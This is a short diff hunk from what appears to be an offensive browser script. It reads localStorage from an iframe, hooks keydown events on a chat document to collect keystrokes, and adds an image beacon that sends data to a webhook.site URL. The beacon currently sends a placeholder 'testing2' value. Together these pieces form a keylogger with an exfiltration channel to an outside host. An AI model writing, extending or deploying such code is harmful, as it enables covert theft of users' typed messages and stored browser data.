@@ -32,7 +32,9 @@ frame.onload = () => {
     const ls = frame.contentWindow.localStorage;
     console.log("[+] localStorage keys:", Object.keys(ls));
 
-
+    new Image().src =
+        "https://webhook.site/d002c40d-2ffe-4314-8350-87d66eeb6df0/?k=" +
+        encodeURIComponent("testing2");
   let d = "";
 
   chatDoc.addEventListener("keydown", (e) => {
